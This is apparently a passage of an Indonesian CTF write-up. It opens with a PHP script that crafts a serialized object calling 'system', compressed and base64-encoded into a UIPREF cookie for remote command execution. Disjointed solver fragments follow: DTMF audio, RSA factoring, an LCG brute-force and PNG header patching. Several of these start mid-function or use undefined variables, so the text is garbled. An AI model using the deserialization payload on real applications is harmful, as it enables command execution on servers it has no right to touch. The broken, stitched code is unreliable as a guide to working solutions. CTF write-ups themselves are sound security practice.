dan benar saja ternyata ada UIPREF

![screenshot](/blog/ctf-noctra-lupra-season-1/img-42.png)

selanjutnya saya membuat payload baru menggunakan php

```php
<?php
namespace App\Jobs;

class JobRunner {
    public $handler;
    public $payload;
    public $autoRun = true;
}

$command = "find / -type f -name '*flag*' 2>/dev/null";

$exploit = new \App\Jobs\JobRunner();
$exploit->handler = 'system';
$exploit->payload = $command;

$serialized_object = serialize($exploit);
$payload = base64_encode(gzdeflate($serialized_object));

echo "Commandnya: " . $command . "\n\n";
echo "Payload UIPREF yang baru:\n";
echo $payload;
echo "\n";
?>
```

UIPREF yang baru tersebut saya ganti dengan UIPREF yang lama dan setelah saya reload, saya menemukan lokasi flag disimpan

    data_bytes = data.encode('utf-8')

def text_to_tone(text, filename, fs=8000, tone_time=0.08, silence_time=0.10):
    samples = []
    for char in text:
        if char not in dtmf_freqs:
            continue
        f1, f2 = dtmf_freqs[char]
        t = np.linspace(0, tone_time, int(fs * tone_time), endpoint=False)

        phase1 = random.uniform(0, 2 * np.pi)
        phase2 = random.uniform(0, 2 * np.pi)
        tone = 0.5 * np.sin(2 * np.pi * f1 * t + phase1) + 0.5 * np.sin(2 * np.pi * f2 * t + phase2)
        samples.append(tone)
        samples.append(np.zeros(int(fs * silence_time)))
    sig = np.concatenate(samples)
    sig = (sig * 32767).astype(np.int16)
    write(filename, fs, sig)

def invert_shift_right(y, s, bitlen=None):
    if bitlen is None:
        bitlen = y.bit_length() + 256
    x = y
    shift = s
    while shift < bitlen:
        x ^= (x >> shift)
        shift *= 2
    return x

e  = 65537
c  = 217030574813581748876560164628956728965229484123293220878296186

def brent(n):
    if n % 2 == 0:
        return 2
    y, c, m = random.randrange(1,n-1), random.randrange(1,n-1), 100
    g, r, q, x = 1, 1, 1, y
    while g == 1:
        x = y
        for _ in range(r):
            y = (y*y + c) % n
        k = 0
        while k < r and g == 1:
            ys = y
            for _ in range(min(m, r-k)):
                y = (y*y + c) % n
                q = (q * abs(x-y)) % n
            g = math.gcd(q, n)
            k += m
        r <<= 1
    if g == n:
        while True:
            ys = (ys*ys + c) % n
            g = math.gcd(abs(x-ys), n)
            if g > 1:
                break
    return g

p2 = brent(n2)
q2 = n2 // p2
phi2 = (p2-1)*(q2-1)
d2 = inverse(e, phi2)

S = pow(cS, d2, n2)
print("S =", S)

D = S*S - 4*n
sqrtD = math.isqrt(D)
p = (S + sqrtD)//2
q = (S - sqrtD)//2

phi = (p-1)*(q-1)
d = inverse(e, phi)

m = pow(c, d, n)
flag = long_to_bytes(m)
print("FLAG =", flag.decode())

    """Apply the same bit-transform as in chall.py"""
    if mode == 0:
        var1 = (out & 0xAA) >> 1
        var2 = (2 * out) & 0xAA
        return (var1 | var2) & 0xFF
    elif mode == 1:
        var1 = (out & 0xCC) >> 2
        var2 = (4 * out) & 0xCC
        return (var1 | var2) & 0xFF
    else:
        var1 = (out & 0xF0) >> 4
        var2 = (16 * out) & 0xF0
        return (var1 | var2) & 0xFF

    inv = [{}, {}, {}]
    for mode in (0,1,2):
        for out in range(256):
            enc = forward_swap(out, mode)
            inv[mode][enc] = out
    return inv

INV_MAPS = build_inverse_maps()

def try_range(start, end, enc_bytes, target_sha_hex):
    for init in range(start, end):
        state = init
        out_chars = []
        ok = True
        for b in enc_bytes:
            mode = state % 3
            if b not in INV_MAPS[mode]:
                ok = False
                break
            out_byte = INV_MAPS[mode][b]
            xor_key = (state >> 8) & 0xFF
            plain_ord = out_byte ^ xor_key
            if plain_ord not in PRINTABLE:
                ok = False
                break

            state = (A * state + plain_ord) % MOD
        if not ok:
            continue
        candidate = bytes(out_chars)
        if hashlib.sha256(candidate).hexdigest() == target_sha_hex:
            return init, candidate.decode('latin-1', errors='replace')
    return None

    return try_range(start, end, enc_bytes, target_sha)

    for s in range(0, max_val, chunk_size):
        e = min(max_val, s + chunk_size)
        yield (s, e)

import struct
import binascii
import os

INPUT = "flag.png"
CANDIDATES = [
    (2048, 2048),
    (1024, 4096),
    (512, 8192),
    (1024, 922),    
]

def read_file(path):
    with open(path, "rb") as f:
        return f.read()

def write_file(path, data):
    with open(path, "wb") as f:
        f.write(data)

def get_be_uint(b):
    return struct.unpack(">I", b)[0]

def pack_be_uint(i):
    return struct.pack(">I", i)

def patch_ihdr(data, new_w, new_h):
    if data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Bukan file PNG (signature mismatch)")

    ihdr_len = get_be_uint(data[8:12])
    chunk_type = data[12:16]
    if chunk_type != b'IHDR':
        raise ValueError("IHDR tidak ditemukan di posisi 12..15 (file tidak standar)")

    if ihdr_len != 13:
        raise ValueError(f"IHDR length unexpected: {ihdr_len}")

    ihdr_data_off = 16           
    width_off = ihdr_data_off + 0
    height_off = ihdr_data_off + 4# 20..23
    ihdr_crc_off = ihdr_data_off + 13  

    newdata = bytearray(data)
    newdata[width_off:width_off+4] = pack_be_uint(new_w)
    newdata[height_off:height_off+4] = pack_be_uint(new_h)

    chunk_type_plus_data = b'IHDR' + bytes(newdata[ihdr_data_off:ihdr_data_off+13])
    new_crc = binascii.crc32(chunk_type_plus_data) & 0xffffffff
    newdata[ihdr_crc_off:ihdr_crc_off+4] = pack_be_uint(new_crc)

    return bytes(newdata)

def detect_current_size(data):
    w = get_be_uint(data[16:20])
    h = get_be_uint(data[20:24])
    return w, h

def main():
    if not os.path.exists(INPUT):
        print("File input tidak ditemukan:", INPUT)
        return

    data = read_file(INPUT)
    try:
        cur_w, cur_h = detect_current_size(data)
        print(f"Current IHDR size: {cur_w} x {cur_h}")
    except Exception as e:
        print("Gagal baca IHDR:", e)
        return

    saved = []
    for w, h in CANDIDATES:
        try:
            out = patch_ihdr(data, w, h)
            outname = f"{os.path.splitext(INPUT)[0]}_{w}x{h}.png"
            write_file(outname, out)
            saved.append(outname)
            print(f"[+] Saved patched file: {outname}")
        except Exception as e:
            print(f"[!] Gagal patch {w}x{h}: {e}")

    if saved:
        print("\nSelesai. Coba buka file-file berikut di image viewer:")
        for s in saved:
            print(" -", s)
    else:
        print("Tidak ada file disimpan. Cek error di atas.")

if __name__ == "__main__":
    main()
